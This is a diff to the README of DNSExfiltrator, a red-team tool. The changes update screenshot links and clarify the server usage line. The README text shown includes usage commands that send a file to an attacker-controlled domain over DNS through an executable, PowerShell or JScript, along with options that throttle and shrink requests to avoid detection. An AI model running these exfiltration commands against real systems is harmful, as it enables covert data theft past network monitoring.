@@ -24,9 +24,7 @@ DNSExfiltrator also provides some optional features to avoid detection:
   - reduction of the DNS request size (*by default it will try to use as much bytes left available in each DNS request for efficiency*)
   - reduction of the DNS label size (*by default it will try to use the longest supported label size of 63 chars*)
 
-<img src="https://dl.dropboxusercontent.com/s/fpg71h06xbwj33e/dnsexfiltrator_02.jpg?dl=0" width="800">
-
-<img src="https://dl.dropboxusercontent.com/s/7c2aqlf4kax3mu9/dnsexfiltrator_01.jpg?dl=0" width="600">
+<img src="https://dl.dropboxusercontent.com/s/z3hjd513jens17e/dnsExfiltrator_04.jpg?dl=0" width="600">
 
 Dependencies
 ----------------------
@@ -41,7 +39,7 @@ Usage
 
 ***SERVER SIDE***
 
-Start the `dnsexfiltrator script passing it the domain name used:
+Start the `dnsexfiltrator.py` script passing it the domain name and decryption password to be used:
 ```
 root@kali:~# ./dnsexfiltrator.py -d mydomain.com -p password
 ```
@@ -61,6 +59,8 @@ dnsExfiltrator.exe <file> <domainName> <password> [s=DNS_server] [t=throttleTime
       requestMaxSize: [OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes..
       labelMaxSize:   [OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.
 ```
+<img src="https://dl.dropboxusercontent.com/s/jqzptt5tqc2e8z9/dnsExfiltrator_01.jpg?dl=0" width="900">
+
 
 2/ Using the PowerShell script, well, call it in any of your prefered way (*you probably know tons of ways of invoking a powershell script*) along with the script parameters. Most basic example:
 ```
@@ -70,6 +70,7 @@ PS c:\DNSExfiltrator> Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p pass
 [...]
 ```
 Check the EXAMPLES section in the script file for further usage examples.
+<img src="https://dl.dropboxusercontent.com/s/067lffd4s45esmu/dnsExfiltrator_02.jpg?dl=0" width="900">
 
 3/ Using the JScript script, pass it the exact same arguments as you would with the standalone Windows executable:
 ```
@@ -79,7 +80,7 @@ Or, with some options:
 ```
 cscript.exe dnsExiltrator.js inputFile mydomain.com password s=my.dns.server.com t=500
 ```
-
+<img src="https://dl.dropboxusercontent.com/s/bzfmzfeejpjkas2/dnsExfiltrator_03.jpg?dl=0" width="900">
 
 TODO
 ----------------
